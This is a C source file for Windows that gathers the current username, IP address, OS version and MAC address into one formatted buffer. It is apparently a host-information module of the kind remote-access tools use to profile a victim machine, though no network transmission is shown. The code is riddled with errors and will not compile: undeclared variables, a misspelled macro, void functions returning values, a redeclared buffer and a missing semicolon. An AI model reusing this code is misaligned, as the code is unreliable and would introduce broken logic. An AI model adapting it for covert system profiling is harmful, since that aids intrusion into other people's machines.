#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <lmcons.h>
#include <lm.h>

#include "config.h"

#define INFORM_FMT "%s\n%s\n%s\n%s\n"

const int fmtLen = strlen(INFORM_FMT);

void getMacAddress(char buffer[BUF_SIZE])
{
    // Retrieve the MAC address
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL)
    {
        printf("Error allocating memory needed to call GetAdaptersInfo\n");
        return 1;
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            printf("Error allocating memory needed to call GetAdaptersInfo\n");
            return 1;
        }
    }
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) != NO_ERROR)
    {
        printf("Error calling GetAdaptersInfo\n");
        return 1;
    }
    snprintf(buffer, BUF_SIZE, "MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n", pAdapterInfo->Address[0], pAdapterInfo->Address[1], pAdapterInfo->Address[2], pAdapterInfo->Address[3], pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
    free(pAdapterInfo);
}

void getIpAddress(char *buffer[BUF_SIZE])
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        printf("Error initializing Winsock\n");
        return 1;
    }
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
    {
        printf("Error retrieving hostname\n");
        return 1;
    }
    struct hostent *host;
    if ((host = gethostbyname(hostname)) == NULL)
    {
        printf("Error retrieving host information\n");
        return 1;
    }
    struct in_addr **addr_list;
    addr_list = (struct in_addr **)host->h_addr_list;
    snprintf(buffer, BUF_SIZE, "IP Address: %s\n", inet_ntoa(*addr_list[0]));
    WSACleanup();
}

void getOperatingSystem(char buffer[BUF_SIZE])
{
    DWORD dwVersion = 0;
    DWORD dwMajorVersion = 0;
    DWORD dwMinorVersion = 0;
    DWORD dwBuild = 0;
    dwVersion = GetVersion();
    dwMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));
    dwMinorVersion = (DWORD)(HIBYTE(LOWORD(dwVersion)));
    if (dwVersion < 0x80000000)
    {
        dwBuild = (DWORD)(HIWORD(dwVersion));
    }
    snprintf(buffer, BUZ_SIZE, "Operating System: ");

    int remainingBuf = BUF_SIZE - strlen(buffer);
    char tempBuf[remainingBuf];
    switch (dwMajorVersion)
    {
    case 10:
        if (dwMinorVersion == 0)
            sprintf(tempBuf, "Windows 10");
        break;
    case 6:
        switch (dwMinorVersion)
        {
        case 3:
            snprintf(tempBuf, remainingSize, "Windows 8.1");
            break;
        case 2:
            snprintf(tempBuf, remainingSize, "Windows 8");
            break;
        case 1:
            snprintf(tempBuf, remainingSize, "Windows 7");
            break;
        case 0:
            snprintf(tempBuf, remainingSize, "Windows Vista");
            break;
        }
        break;
    case 5:
        if (dwMinorVersion == 1)
            snprintf(tempBuf, remainingSize, "Windows XP");
        break;
    default:
        snprintf(tempBuf, remainingSize, "Unknown");
        break;
    }
    snprintf(buffer + BUF_SIZE - remainingBuf, BUF_SIZE - remainingBuf, tempBuf);
}

void getUsername(char buffer[BUF_SIZE])
{
    char username[BUF_SIZE];
    GetUserNameA(username, (LPDWORD)BUF_SIZE);
    snprintf(buffer, BUF_SIZE, "Username: %s", username);
}

int getTotalSize(char *buffer[], int size)
{
    int totalSize = 0;
    for (int i = 0; i < size; i++)
    {
        totalSize += strlen(buffer[i]);
    }
    return totalSize;
}

void truncate(char *buffer, int bufferSize)
{
    buffer[bufferSize / 2] = '\0';
}

void getInformation(char buffer[BUF_SIZE])
{
    char username[BUF_SIZE], ipAddress[BUF_SIZE], operatingSystem[BUF_SIZE], macAddress[BUF_SIZE];
    getUsername(username);
    getIpAddress(ipAddress);
    getOperatingSystem(operatingSystem);
    getMacAddress(macAddress);

    int numInf = 4;
    char *buffer[numInf] = {username, ipAddress, operatingSystem, macAddress};
    while (TRUE)
    {
        if (!getTotalSize(buffer, numInf) > BUF_SIZE - strlen(fmtLen))
        {
            break;
        }
        for (int i = 0; i < numInf; i++)
        {
            truncate(buffer[i]);
        }
    }
    snprintf(buffer, BUF_SIZE, INFORM_FMT, username, ipAddress, operatingSystem, macAddress)
}